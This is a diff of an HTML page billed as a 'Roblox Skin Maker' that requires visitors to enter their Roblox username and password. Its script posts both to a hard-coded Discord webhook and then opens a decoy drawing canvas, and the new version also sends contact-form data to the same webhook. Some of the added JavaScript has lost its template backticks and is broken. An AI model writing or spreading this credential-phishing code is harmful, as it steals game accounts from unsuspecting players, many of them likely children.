@@ -4,51 +4,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Skin Maker 2.0</title>
+    <title>Roblox Skin Maker 1.0</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            background: #2c3e50; /* Dark background */
-            color: #ecf0f1; /* Light text color */
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            color: #333;
             overflow-x: hidden;
         }
 
         .navbar {
-            background-color: #34495e; /* Slightly lighter background */
+            background-color: #333;
             overflow: hidden;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
         .navbar a {
             float: left;
             display: block;
-            color: #ecf0f1;
+            color: #f2f2f2;
             text-align: center;
-            padding: 15px 25px;
+            padding: 14px 20px;
             text-decoration: none;
             transition: background-color 0.3s, color 0.3s;
         }
 
         .navbar a:hover {
-            background-color: #1abc9c;
-            color: #fff;
+            background-color: #ddd;
+            color: #333;
         }
 
         .container {
             max-width: 800px;
             margin: 40px auto;
-            padding: 25px;
-            background-color: #34495e;
+            padding: 20px;
+            background-color: #fff;
             border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
 
         h1 {
             margin-bottom: 20px;
-            color: #1abc9c;
+            color: #0072ff;
             animation: fadeIn 2s ease-in-out;
         }
 
@@ -57,31 +57,29 @@
         button {
             display: block;
             width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            border: 1px solid #7f8c8d;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
             border-radius: 5px;
             box-sizing: border-box;
             transition: border-color 0.3s;
-            background-color: #34495e;
-            color: #ecf0f1;
         }
 
         input:focus,
         button:focus {
-            border-color: #1abc9c;
+            border-color: #0072ff;
             outline: none;
         }
 
         button {
-            background-color: #1abc9c;
+            background-color: #007bff;
             color: #fff;
             cursor: pointer;
             transition: background-color 0.3s, transform 0.2s;
         }
 
         button:hover {
-            background-color: #16a085;
+            background-color: #0056b3;
             transform: scale(1.05);
         }
 
@@ -89,8 +87,8 @@
             text-align: center;
             margin-top: 40px;
             padding: 20px;
-            background-color: #34495e;
-            border-top: 1px solid #7f8c8d;
+            background-color: #f1f1f1;
+            border-top: 1px solid #ccc;
         }
 
         .footer img {
@@ -107,64 +105,70 @@
         .footer a {
             margin: 0 10px;
             text-decoration: none;
-            color: #1abc9c;
+            color: #007bff;
             transition: color 0.3s;
         }
 
         .footer a:hover {
             text-decoration: underline;
-            color: #16a085;
+            color: #0056b3;
         }
 
         .required {
-            color: #e74c3c;
+            color: red;
             font-weight: bold;
         }
 
-        .faq,
-        .contact-form {
+        .faq {
             margin-top: 40px;
             padding: 20px;
-            background-color: #34495e;
+            background-color: #f9f9f9;
             border-radius: 8px;
             text-align: left;
         }
 
-        .faq h2,
-        .contact-form h2 {
-            margin-bottom: 15px;
-            color: #1abc9c;
+        .faq h2 {
+            margin-bottom: 10px;
         }
 
-        .faq p,
-        .contact-form p {
-            margin: 15px 0;
+        .faq p {
+            margin: 10px 0;
+        }
+
+        .contact-form {
+            margin-top: 40px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .contact-form h2 {
+            margin-bottom: 10px;
         }
 
         .contact-form input[type="text"],
         .contact-form input[type="email"],
         .contact-form textarea {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            border: 1px solid #7f8c8d;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
             border-radius: 5px;
             box-sizing: border-box;
             transition: border-color 0.3s;
-            background-color: #34495e;
-            color: #ecf0f1;
         }
 
         .contact-form input:focus,
         .contact-form textarea:focus {
-            border-color: #1abc9c;
+            border-color: #0072ff;
             outline: none;
         }
 
         .contact-form button {
             width: 100%;
-            padding: 15px;
-            background-color: #1abc9c;
+            padding: 12px;
+            background-color: #007bff;
             color: #fff;
             border: none;
             border-radius: 5px;
@@ -173,33 +177,32 @@
         }
 
         .contact-form button:hover {
-            background-color: #16a085;
+            background-color: #0056b3;
             transform: scale(1.05);
         }
 
         .accordion {
-            background-color: #1abc9c;
+            background-color: #0072ff;
             color: #fff;
             cursor: pointer;
-            padding: 15px;
+            padding: 10px;
             border: none;
             text-align: left;
             outline: none;
             font-size: 16px;
             transition: background-color 0.3s;
-            border-radius: 5px;
         }
 
         .accordion:hover,
         .accordion.active {
-            background-color: #16a085;
+            background-color: #0056b3;
         }
 
         .panel {
             padding: 0 18px;
             display: none;
             overflow: hidden;
-            background-color: #2c3e50;
+            background-color: #f1f1f1;
             border-radius: 5px;
         }
 
@@ -221,8 +224,10 @@
         <a href="#contact">Contact</a>
     </div>
 
+    <div class="particles-js" id="particles-js"></div>
+
     <div class="container">
-        <h1>Roblox Skin Maker 2.0</h1>
+        <h1>Roblox Skin Maker 1.0</h1>
         <p><strong>Connect to your account <span class="required">REQUIRED</span></strong></p>
         <p>Enter Roblox username and password:</p>
         <input type="text" id="username" placeholder="Username">
@@ -263,22 +268,118 @@
             <a href="#">Twitter</a>
             <a href="#">Instagram</a>
         </p>
-        <p>&copy; 2024 Roblox Skin Maker. All rights reserved.</p>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <script>
-        // Function to handle the button click
+        particlesJS('particles-js', {
+            "particles": {
+                "number": {
+                    "value": 80,
+                    "density": {
+                        "enable": true,
+                        "value_area": 800
+                    }
+                },
+                "color": {
+                    "value": "#ffffff"
+                },
+                "shape": {
+                    "type": "circle",
+                    "stroke": {
+                        "width": 0,
+                        "color": "#000000"
+                    },
+                    "polygon": {
+                        "nb_sides": 5
+                    }
+                },
+                "opacity": {
+                    "value": 0.5,
+                    "random": false,
+                    "anim": {
+                        "enable": false,
+                        "speed": 1,
+                        "opacity_min": 0.1,
+                        "sync": false
+                    }
+                },
+                "size": {
+                    "value": 3,
+                    "random": true,
+                    "anim": {
+                        "enable": false,
+                        "speed": 40,
+                        "size_min": 0.1,
+                        "sync": false
+                    }
+                },
+                "line_linked": {
+                    "enable": true,
+                    "distance": 150,
+                    "color": "#ffffff",
+                    "opacity": 0.4,
+                    "width": 1
+                },
+                "move": {
+                    "enable": true,
+                    "speed": 6,
+                    "direction": "none",
+                    "random": false,
+                    "straight": false,
+                    "out_mode": "out",
+                    "bounce": false,
+                    "attract": {
+                        "enable": false,
+                        "rotateX": 600,
+                        "rotateY": 1200
+                    }
+                }
+            },
+            "interactivity": {
+                "detect_on": "canvas",
+                "events": {
+                    "onhover": {
+                        "enable": true,
+                        "mode": "repulse"
+                    },
+                    "onclick": {
+                        "enable": true,
+                        "mode": "push"
+                    },
+                    "resize": true
+                },
+                "modes": {
+                    "repulse": {
+                        "distance": 100,
+                        "duration": 0.4
+                    },
+                    "push": {
+                        "particles_nb": 4
+                    }
+                }
+            },
+            "retina_detect": true
+        });
+
         function openDrawingInterface() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Data to send to webhook
+            if (!username || !password) {
+                alert('Please fill in both the username and password fields!');
+                return;
+            }
+
+            // Webhook URL for drawing interface
             const webhookUrl = 'https://discord.com/api/webhooks/1254780445640359956/94A5ZWNCkAEvzCX6vSWMBXmTCT0mCxlI0xV6geNGV3v028Mgn94IHkPpEBm-p8eySBlS';
+
+            // Data to send to webhook
             const data = {
-                content: `Username: ${username}\nPassword: ${password}`
+                content: Username: ${username}\nPassword: ${password}
             };
 
-                        fetch(webhookUrl, {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -288,140 +389,125 @@
                 .then(response => {
                     if (!response.ok) {
                         return response.text().then(text => {
-                            throw new Error(`Failed to send data to webhook: ${response.status} ${response.statusText} - ${text}`);
+                            throw new Error(Failed to send data to webhook: ${response.status} ${response.statusText} - ${text});
                         });
                     }
-                    alert('Account linked successfully!');
-                    // Open drawing interface after successful submission
-                    openDrawingInterfaceWindow();
+                    // Open the drawing interface
+                    const drawingWindow = window.open('', '_blank', 'width=800,height=600');
+                    drawingWindow.document.write(
+                        <style>
+                            body { font-family: Arial, sans-serif; }
+                            h1 { color: #0072ff; }
+                            #controls { display: flex; justify-content: space-between; margin-bottom: 10px; }
+                            canvas { border: 1px solid #ccc; display: block; margin: 0 auto; }
+                        </style>
+                        <h1>Drawing Interface</h1>
+                        <div id="controls">
+                            <input type="color" id="colorPicker">
+                            <select id="penSize">
+                                <option value="1">Small</option>
+                                <option value="5">Medium</option>
+                                <option value="10">Large</option>
+                            </select>
+                            <button id="saveButton">Save Drawing</button>
+                        </div>
+                        <canvas id="drawingCanvas" width="780" height="400"></canvas>
+                    );
+
+                    const canvas = drawingWindow.document.getElementById('drawingCanvas');
+                    const ctx = canvas.getContext('2d');
+                    const colorPicker = drawingWindow.document.getElementById('colorPicker');
+                    const penSize = drawingWindow.document.getElementById('penSize');
+
+                    let isDrawing = false;
+                    let lastX = 0;
+                    let lastY = 0;
+
+                    canvas.addEventListener('mousedown', (e) => {
+                        isDrawing = true;
+                        [lastX, lastY] = [e.offsetX, e.offsetY];
+                    });
+
+                    canvas.addEventListener('mousemove', (e) => {
+                        if (!isDrawing) return;
+                        ctx.beginPath();
+                        ctx.moveTo(lastX, lastY);
+                        ctx.lineTo(e.offsetX, e.offsetY);
+                        ctx.strokeStyle = colorPicker.value;
+                        ctx.lineWidth = penSize.value;
+                        ctx.lineCap = 'round';
+                        ctx.stroke();
+                        [lastX, lastY] = [e.offsetX, e.offsetY];
+                    });
+
+                    canvas.addEventListener('mouseup', () => isDrawing = false);
+                    canvas.addEventListener('mouseout', () => isDrawing = false);
+
+                    drawingWindow.document.getElementById('saveButton').addEventListener('click', () => {
+                        const image = canvas.toDataURL('image/png');
+                        const a = document.createElement('a');
+                        a.href = image;
+                        a.download = 'drawing.png';
+                        a.click();
+                    });
                 })
                 .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to link account. Please try again.');
+                    console.error('There was a problem sending the username and password to the webhook:', error);
+                    alert('An error occurred while linking your account. Please try again.');
                 });
         }
 
-        function openDrawingInterfaceWindow() {
-            const drawingWindow = window.open("", "Drawing Interface", "width=800,height=600");
-            drawingWindow.document.write(`
-                <html>
-                <head>
-                    <title>Drawing Interface</title>
-                    <style>
-                        body {
-                            margin: 0;
-                            padding: 0;
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            background-color: #2c3e50;
-                            color: #ecf0f1;
-                            overflow: hidden;
-                        }
-                        canvas {
-                            border: 1px solid #7f8c8d;
-                        }
-                        .toolbar {
-                            position: absolute;
-                            top: 10px;
-                            left: 10px;
-                            display: flex;
-                            flex-direction: column;
-                            gap: 10px;
-                        }
-                        .toolbar button {
-                            padding: 10px;
-                            background-color: #1abc9c;
-                            color: #fff;
-                            border: none;
-                            border-radius: 5px;
-                            cursor: pointer;
-                            transition: background-color 0.3s;
-                        }
-                        .toolbar button:hover {
-                            background-color: #16a085;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="toolbar">
-                        <button onclick="clearCanvas()">Clear Canvas</button>
-                        <button onclick="saveCanvas()">Save</button>
-                    </div>
-                    <canvas id="drawingCanvas" width="800" height="600"></canvas>
-                    <script>
-                        const canvas = document.getElementById('drawingCanvas');
-                        const ctx = canvas.getContext('2d');
-                        let painting = false;
-                        let color = '#ecf0f1';
-                        let lineWidth = 5;
-
-                        function startPosition(e) {
-                            painting = true;
-                            draw(e);
-                        }
-
-                        function endPosition() {
-                            painting = false;
-                            ctx.beginPath();
-                        }
-
-                        function draw(e) {
-                            if (!painting) return;
-                            ctx.lineWidth = lineWidth;
-                            ctx.lineCap = 'round';
-                            ctx.strokeStyle = color;
-
-                            ctx.lineTo(e.clientX - canvas.offsetLeft, e.clientY - canvas.offsetTop);
-                            ctx.stroke();
-                            ctx.beginPath();
-                            ctx.moveTo(e.clientX - canvas.offsetLeft, e.clientY - canvas.offsetTop);
-                        }
-
-                        canvas.addEventListener('mousedown', startPosition);
-                        canvas.addEventListener('mouseup', endPosition);
-                        canvas.addEventListener('mousemove', draw);
-
-                        function clearCanvas() {
-                            ctx.clearRect(0, 0, canvas.width, canvas.height);
-                        }
-
-                        function saveCanvas() {
-                            const dataURL = canvas.toDataURL('image/png');
-                            const link = document.createElement('a');
-                            link.href = dataURL;
-                            link.download = 'drawing.png';
-                            link.click();
-                        }
-                    </script>
-                </body>
-                </html>
-            `);
-        }
-
-        // FAQ accordion functionality
-        document.querySelectorAll('.accordion').forEach(button => {
-            button.addEventListener('click', () => {
-                const panel = button.nextElementSibling;
-                button.classList.toggle('active');
-                if (panel.style.display === "block") {
-                    panel.style.display = "none";
-                } else {
-                    panel.style.display = "block";
-                }
-            });
-        });
-
-        // Contact form submission
         function sendContactForm() {
             const name = document.getElementById('contactName').value;
             const email = document.getElementById('contactEmail').value;
             const message = document.getElementById('contactMessage').value;
 
-            // Replace this with your contact form handling logic
-            console.log('Contact form submitted:', { name, email, message });
-            alert('Your message has been sent. Thank you for contacting us!');
+            if (!name || !email || !message) {
+                alert('Please fill out all fields.');
+                return;
+            }
+
+            // Webhook URL for contact form
+            const contactWebhookUrl = 'https://discord.com/api/webhooks/1254780445640359956/94A5ZWNCkAEvzCX6vSWMBXmTCT0mCxlI0xV6geNGV3v028Mgn94IHkPpEBm-p8eySBlS';
+
+            // Data to send to webhook
+            const contactData = {
+                content: Contact Form Submission:\nName: ${name}\nEmail: ${email}\nMessage: ${message}
+            };
+
+            fetch(contactWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(contactData)
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error(Failed to send contact form: ${response.status} ${response.statusText} - ${text});
+                        });
+                    }
+                    alert('Your message has been sent successfully!');
+                })
+                .catch(error => {
+                    console.error('There was a problem sending the contact form:', error);
+                    alert('An error occurred while sending your message. Please try again.');
+                });
         }
+
+        // Accordion functionality for FAQ
+        document.querySelectorAll('.accordion').forEach(button => {
+            button.addEventListener('click', () => {
+                button.classList.toggle('active');
+                const panel = button.nextElementSibling;
+                if (panel.style.display === 'block') {
+                    panel.style.display = 'none';
+                } else {
+                    panel.style.display = 'block';
+                }
+            });
+        });
     </script>
 </body>
 
